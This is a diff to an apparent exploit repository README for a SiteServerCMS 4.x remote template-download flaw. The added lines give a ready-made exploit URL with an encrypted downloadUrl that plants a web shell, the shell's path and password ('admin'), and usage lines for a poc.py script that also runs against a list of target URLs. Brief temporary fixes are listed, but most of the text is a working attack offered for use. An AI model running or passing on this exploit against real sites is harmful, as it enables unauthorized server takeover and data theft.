@@ -25,12 +25,19 @@ SiteServerCMS 4.x
 ### PoC
 Author:We1h0@PoxTeam
 
-python poc.py -u http://localhost
+<code>http://localhost/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest</code>
+
+python2 poc.py -u http://localhost
 ![avatar](https://raw.githubusercontent.com/zhaoweiho/SiteServerCMS-Remote-download-Getshell/master/img/494367940.jpg)
 
-python poc.py -f url.txt
+python2 poc.py -f url.txt
 
 Ps:注意最后面没/
+
+WebShell:http://localhost/SiteFiles/SiteTemplates/sectest/include.aspx
+PassWord:admin
+
+
 
 ### 搜索引擎关键字:
 
@@ -41,10 +48,12 @@ inurl:/sitesever/login.aspx
 ### 临时修复方案
 修改 
 
-> C:/WebSite/SiteFiles/Configuration/Configuration.config
+> 1.C:/WebSite/SiteFiles/Configuration/Configuration.config
 
 secretKey的值
 
+> 2.更改后台地址
+> 3.更改(或移除模板下载功能)/SiteServer/Ajax/ajaxOtherService.aspx路径
 
 ### downloadUrl加密工具
 #### C#
